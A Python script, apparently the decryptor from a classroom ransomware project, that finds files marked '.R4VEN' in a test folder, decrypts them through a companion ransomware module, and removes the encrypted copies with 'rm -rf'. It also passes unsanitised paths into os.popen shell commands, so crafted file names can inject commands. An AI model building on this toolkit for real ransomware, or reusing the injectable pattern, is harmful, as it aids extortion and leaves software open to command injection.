import subprocess as command
import os
import re
from ransomware_menager import decrypt


def listDirectories(Dirpath):
    for resultado in os.listdir(Dirpath):
        result2 = os.popen("file " + Dirpath + resultado)
        for arq in result2:
            if not re.search(r'directory', arq):
                files.append(Dirpath + resultado)
            else:
                listDirectories(Dirpath + resultado + "/")


path = "/home/th3r4ven/Documents/aula/checkpoint3/ransomware/teste/"
files = []
directories = []
listagem = (os.listdir(path))

for file in listagem:
    result = os.popen("file " + path + file)
    for resu in result:
        if not re.search(r"directory", resu):
            files.append(str(path + file))
        else:
            directories.append(path + file + "/")

for direc in directories:
    listDirectories(direc)

for decryptFilePath in files:

    if re.search(r'.R4VEN', decryptFilePath):
        with open(decryptFilePath, 'rb') as arq:
            content = arq.read()
        arq.close()

        content = decrypt(content)
        filePath = decryptFilePath.split('.R4VEN')[0]
        with open(filePath + content[1], 'wb')as arq:
            arq.write(content[0])
        arq.close()

        command.run(['rm', '-rf', decryptFilePath])
